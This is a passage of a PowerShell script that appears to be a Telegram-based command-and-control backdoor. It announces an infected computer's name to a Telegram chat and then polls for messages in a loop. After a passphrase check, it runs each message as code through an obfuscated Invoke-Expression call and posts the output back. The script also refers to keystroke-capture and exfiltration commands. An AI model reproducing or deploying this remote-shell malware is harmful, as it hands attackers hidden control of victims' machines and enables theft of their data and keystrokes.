$ReadAsArray= Get-Content -Path (Join-Path $env:temp -ChildPath "tgc2.txt") | where {$_.length -gt 0}
    foreach ($line in $ReadAsArray){
    $ArrObj=New-Object psobject
    $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
    $FixedResult +=$ArrObj
    }
return $FixedResult
}

# Message Interpretation
Function SendMSG{
param($Messagetext,$ChatID)
$FixedText=CleanString -Stream $Messagetext
$Mts | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
$JsonData=($Mts | ConvertTo-Json)
irm -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
$catcher = $FixedText
}

Function ReceiveMSG{
try{
    $inMessage=irm -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
    return $inMessage.result[-1]
    }
Catch{return "Telegram C2 Failed"}
}

#-------------------------------------------- START THE WAIT TO CONNECT LOOP ---------------------------------------------------

# Message 'waiting for passphrase'
$contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
Post-Message

# Start the main wait loop.
While ($true){
Sleep 2
$messages=ReceiveMSG
    if ($LastUnAuthMsg -like $null){$LastUnAuthMsg=$messages.message.date}
    if (!($AcceptedSession)){$CheckAuthentication=IsAuth -CheckMessage $messages}
    Else{
        if (($CheckAuthentication -ne 0) -and ($messages.message.text -notlike $PassPhrase) -and ($messages.message.date -ne $lastexecMessageID)){
            try{
                $Result=ie`x($messages.message.text) -ErrorAction Stop
                $Result
                if (($result.length -eq 0) -or ($messages.message.text -contains "KeyCapture") -or ($messages.message.text -contains "Exfiltration")){}
                else{
                SendMSG -Messagetext $Result -ChatID $messages.message.chat.id
                }
                }catch {
                    if($global:errormsg -eq 1){
                    SendMSG -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id
                    }
                }
            Finally{$lastexecMessageID=$messages.message.date}
        }
    }
}
